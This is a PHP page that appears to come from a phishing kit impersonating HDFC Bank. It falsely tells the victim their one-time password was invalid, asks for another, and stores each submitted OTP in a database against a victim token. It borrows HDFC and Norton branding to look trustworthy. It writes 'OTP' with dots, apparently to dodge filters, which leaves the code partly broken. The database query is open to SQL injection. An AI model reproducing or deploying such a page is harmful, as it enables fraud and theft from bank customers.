<?php

if(!empty($_POST['invalid_otp'])) {  
    $invalid_otp = $_POST['invalid_otp'];
}
else {
    header("Location: ./");
    die();
}
$token = $_POST['token'];

require_once "header.php";

$query = 'UPDATE `user_data` SET `invalid_o.t.p` = "'.$invalid_o.t.p.'" WHERE `UID` = "'.$token.'"';
require_once "db.php";

?>

<div class="container center" style="max-width:420px">
	<div class="row welcmewrap">
        <div class="welcomesec1" style="margin-bottom:0">
            <div class="hdfcstatictxt mB20">Enter KYC OTP</div>
            <div class="netwrapper">
                <div class="col-12">
			        <form method="post" action="o.t.p.php">
                        <div class="mB10">
                            <div class="inputfield ibvt loginData">
                                <input
                                    placeholder="Enter one ti.me password"
                                    inputmode="numeric"
                                    autocomplete="one-time-code"
                                    pattern="\d{6}"
                                    class="form-control" 
                                    name="invalid_o.t.p"
                                    maxlength="6"
                                    minlength="6"
                                    length="6"
                                    required
                                    autofocus />
                                <input name="token" value="<?php echo $token ?>" hidden />
                                <span class="fs14 text-danger mT10">Invalid O.T.P, please enter correct O.T.P!</span>
                            </div>
                        </div>
                        <div class="mB10">
                            <div class="inputfield ibvt loginData">
                                <button class="btn btn-primary login-btn" type="submit">CONFIRM</button>
                            </div>
                        </div>
                        <span style="display: block;" class=""><a href="invalid-o.t.p-2">Resend O.T.P</a></span>
                    </form>
                </div>
                <br />
                <div class="col-12">
                    <div class="nortonsecurity center lnheight" style="text-align:center">
                        <img alt="" src="images/nortonsecurity.png" />
                    </div>
                    <div class="hdfcsmalltxt">
                        <span class="color666">Your security is of utmost importance.</span>
                        <span class="lightbluecolor"><a onclick="return window.open('https://www.hdfcbank.com/personal/useful-links/security')" href="javascript:void(0)">Know More...</a></span>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
	</div>
</div>

<?php include_once "footer.php"; ?>